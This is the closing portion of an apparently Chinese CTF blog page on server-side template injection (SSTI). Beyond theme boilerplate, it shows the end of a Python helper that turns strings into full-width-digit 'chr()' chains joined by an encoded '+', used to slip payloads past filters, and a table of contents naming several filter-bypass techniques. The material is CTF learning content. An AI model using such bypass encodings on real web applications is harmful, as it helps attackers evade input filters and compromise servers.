+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ch</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xfee0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ch</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="n">full</span> <span class="o">+=</span> <span class="n">ch</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">full</span>
+</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;你要输入的字符串：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">str2chr</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span>  <span class="n">result</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34;chr(&#34;</span><span class="o">+</span><span class="n">half2full</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span><span class="o">+</span><span class="s2">&#34;)%2b&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">str2chr</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">])</span>
+</span></span></code></pre></div></div>
+    <footer class="article-footer"><div class="sponsor-wrapper">
+  <div class="sponsor-button-wrapper">
+    <div class="sponsor-icon rotate"></div>
+    <div class="sponsor-title">赞助</div>
+    <div class="sponsor-icon rotate"></div>
+  </div><div class="sponsor-tip">文章内容有收获?打赏一元</div><div class="sponsor-qr"><div class="sponsor-qr-image-wrapper">
+          <img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250618163116936.jpg" alt="支付宝" width="200" />
+          <p class="sponsor-qr-name">支付宝</p>
+        </div></div></div><div class="share-wrapper"><a href="https://twitter.com/intent/tweet?url=https://www.lier.xin/post/ctfshow_ssti/&amp;text=Ctfshow_ssti&amp;via=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="Ctfshow_ssti">
+      <div class="share-icon icon icon-twitter"></div>
+    </a><a href="https://connect.qq.com/widget/shareqq/index.html?url=https://www.lier.xin/post/ctfshow_ssti/&amp;title=Ctfshow_ssti&amp;desc=ctfshow%e9%87%8cweb%e5%85%a5%e9%97%a8php%e7%89%b9%e6%80%a7%e7%9a%84%e6%80%bb%e7%bb%93&amp;source=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="Ctfshow_ssti">
+      <div class="share-icon icon icon-qq"></div>
+    </a><a href="javascript:;"  title="Ctfshow_ssti">
+      <div class="share-icon icon icon-weixin"><div id="share-weixin">
+            <div class="share-weixin-dom">
+              <div class="share-weixin-content">
+                <img id="share-weixin-banner"> 
+                <div id="share-weixin-title"></div>
+                <div id="share-weixin-desc"></div>
+              </div>
+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hugo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div></div>
+    </a></div><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf-show"
+        rel="tag"
+        >CTF-SHOW</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ssti"
+        rel="tag"
+        >SSTI</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap article-nav-link-left"><img
+            data-src="/images/ctfshow.png"
+            data-sizes="auto"
+            alt="Ctfshow_rce"
+            class="lazyload"
+          /><a href="/post/ctfshow_rce/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">Ctfshow_rce</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="giscus">
+          <span>giscus</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment giscus-comment" data-aos="fade-up"
+     >
+    </div></div>
+</section></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Lier
+    </div><div>
+        <span class="icon-brush"
+          >&nbsp;24.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:59</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#payload收集">payload收集</a></li>
+    <li><a href="#思路一">思路一</a></li>
+    <li><a href="#思路二">思路二</a></li>
+    <li><a href="#框架tricks">框架tricks</a>
+      <ul>
+        <li><a href="#jinja2">jinja2</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#bypass-1"><code>{}</code>bypass</a>
+      <ul>
+        <li><a href="#姿势">姿势</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypass-2"><code>[]</code>bypass</a></li>
+    <li><a href="#数字bypass">数字bypass</a></li>
+    <li><a href="#bypass-3"><code>''&quot;&quot;</code>bypass</a></li>
+    <li><a href="#_bypass"><code>_</code>bypass</a></li>
+    <li><a href="#数字bypass-1">数字bypass</a></li>
+  </ul>
+</nav>
+  </div>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Lier"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Lier</div>
+  <div class="sidebar-description">溯本求源，大道至简</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">28</div>
+  </div>
+</div>
+<div class="sidebar-social"><div class="icon-email sidebar-social-icon">
+      <a
+        href="3310338687@qq.com"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/lierbushiwo"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/material-theme@1.0.0/dist/material-theme.umd.js"
+    integrity="sha384-vLev0II0HKFaxkcm&#43;/7kX5IGwVFBASkGchU311wmU/veIj2bB0UcBkQbW6yw2asK" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "J8X5DH5JF8",
+        apiKey: "230e85f1c0d5d9a9ad704efbc003442a",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"></script><script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Lier",
+          title: "Ctfshow_ssti",
+          url: "https:\/\/www.lier.xin\/post\/ctfshow_ssti\/",
+          description: "ctfshow里web入门php特性的总结",
+          cover: "https:\/\/www.lier.xin\/images\/ctfshow.png",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {
+    valine: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.valine-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/valine@1.5.1\/dist\/Valine.min.js',
+          !'webcache|valine@1.5.1\/dist\/Valine.min.js'.startsWith('local') ? 'sha384-3ma91AExDeMAZ1rjTjaP8V2A2obQE\u002bs5ltKRwYlwdpArz9xVbp0tF3b0VV2ACNPn' : undefined
+        );
+        script.onload = () => {
+          const GUEST_INFO = ['nick', 'mail', 'link'];
+          const guest_info = 'nick,mail,link'.split(',').filter((item) => {
+            return GUEST_INFO.indexOf(item) > -1
+          });
+          const recordIP = JSON.parse('true');
+          const highlight = JSON.parse('true');
+          const visitor = JSON.parse('false');
+          const serverURLs = undefined;
+
+          new Valine({
+            el: '.valine-comment',
+            appId: "",
+            appKey: "",
+            placeholder: "Just go go",
+            pageSize: '10',
+            avatar: 'mp',
+            lang: document.documentElement.lang || 'en',
+            recordIP: recordIP,
+            highlight: highlight,
+            visitor: visitor,
+            requiredFields: guest_info,
+            path: window.location.pathname,
+            serverURLs,
+          });
+        };
+        document.head.appendChild(script);
+      }
+    },
+    waline: {
+      enable: false,
+      load: async () => {
+        const container = document.querySelector('.waline-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        let walineInit;
+        const walineCdn = 'https:\/\/npm.webcache.cn\/@waline\/client@2.15.8\/dist\/waline.mjs';
+        
+        if ('webcache|@waline\/client@2.15.8\/dist\/waline.mjs'.startsWith('local')) {
+          
+          const module = await safeImport(walineCdn);
+          walineInit = module.init;
+        } else {
+          
+          const module = await safeImport(
+            walineCdn, 
+            'sha384-9sbqJjrfGjbkI6\/PI4nU\/MvBfEmkkPC4YK9I4zBeMIf1CVCZdCMH\/KinBEAZII\/5'
+          );
+          walineInit = module.init;
+        }
+        
+        window.walineInstance = walineInit({
+          el: '.waline-comment',
+          serverURL: '',
+          lang: document.documentElement.lang || 'en',
+          locale: JSON.parse("{}"),
+          emoji: JSON.parse("[\"https://unpkg.com/@waline/emojis@1.2.0/weibo\",\"https://unpkg.com/@waline/emojis@1.2.0/alus\",\"https://unpkg.com/@waline/emojis@1.2.0/bilibili\",\"https://unpkg.com/@waline/emojis@1.2.0/qq\",\"https://unpkg.com/@waline/emojis@1.2.0/tieba\",\"https://unpkg.com/@waline/emojis@1.2.0/tw-emoji\"]"),
+          meta: JSON.parse("[\"nick\",\"mail\",\"link\"]"),
+          requiredMeta: JSON.parse("[\"nick\",\"mail\"]"),
+          wordLimit:  0 ,
+          comment: true,
+          pageSize:  10 ,
+          dark: 'html[data-theme="dark"]',
+          pageview:  true ,
+        });
+      }
+    },
+    twikoo: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.twikoo-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/twikoo@1.6.44\/dist\/twikoo.all.min.js',
+          !'webcache|twikoo@1.6.44\/dist\/twikoo.all.min.js'.startsWith('local') ? 'sha384-kwWLC0HjeZZnVPqCJ1AncI8tsk\u002bkQqF9TbAmCclcc9Z0hGkfgHRzeQZxmdmZhE0K' : undefined
+        );
+        script.onload = () => {
+          twikoo.init({
+            envId: '',
+            el: '.twikoo-comment',
+            region: '',
+            lang: document.documentElement.lang || 'en',
+          });
+          twikoo.getCommentsCount({
+            envId: '',
+            region: '',
+            urls: [
+              'https\/\/www.lier.xin\/post\/ctfshow_ssti\/'
+            ],
+            includeReply: false
+          }).then((res) => {
+            document.querySelector('.twikoo-comment-count').innerText = res[0].count;
+          }).catch((err) => {
+            console.error(err);
+          });
+        };
+        document.head.appendChild(script);
+      }
+    },
+    gitalk: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: '',
+            clientSecret: '',
+            repo: '',
+            owner: '',
+            admin: JSON.parse("null"),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    giscus: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.giscus-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        
+        const existingScript = container.querySelector('script[src*="giscus.app/client.js"]');
+        if (existingScript) existingScript.remove();
+        const existingFrame = document.querySelector('iframe.giscus-frame');
+        if (existingFrame) existingFrame.remove();
+
+        
+        const giscusScript = document.createElement('script');
+        const domMode = document.documentElement.getAttribute("data-theme");
+        giscusScript.src = 'https://giscus.app/client.js';
+        giscusScript.setAttribute('data-repo', 'lierbushiwo\/lierbushiwo.github.io');
+        giscusScript.setAttribute('data-repo-id', 'R_kgDOO-UzrQ');
+        giscusScript.setAttribute('data-category', 'Announcements');
+        giscusScript.setAttribute('data-category-id', 'DIC_kwDOO-Uzrc4CrsyH');
+        giscusScript.setAttribute('data-mapping', '0');
+        giscusScript.setAttribute('data-strict', '0');
+        giscusScript.setAttribute('data-reactions-enabled', '1');
+        giscusScript.setAttribute('data-emit-metadata', '0');
+        giscusScript.setAttribute('data-input-position', 'bottom');
+        giscusScript.setAttribute('data-theme', domMode === 'dark' ? 'dark' : 'light');
+        giscusScript.setAttribute('data-lang', document.documentElement.lang || 'en');
+        giscusScript.setAttribute('crossorigin', 'anonymous');
+        giscusScript.async = true;
+        container.appendChild(giscusScript);
+        document.body.addEventListener('light-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'light' } } }, 'https://giscus.app');
+        });
+        document.body.addEventListener('dark-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'dark' } } }, 'https://giscus.app');
+        });
+      }
+    }
+  };
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/qrcode@1.4.4/build/qrcode.min.js"
+    deferdata-pjaxintegrity="sha384-0RsG1yo/crf/1Qc14sho26SXXOTngNCjgJw7fuvXBt9W/OChF/Ijx&#43;aUuBDqQwEk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/html-to-image@1.11.11/dist/html-to-image.js"
+    deferdata-pjaxintegrity="sha384-UbfRVKN3/elS1r7JcK2FhmPP&#43;KlJ4CvYwbyYD7tH&#43;uTkbT9bNJr9eJeQ0FoFbAgz" crossorigin="anonymous"></script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
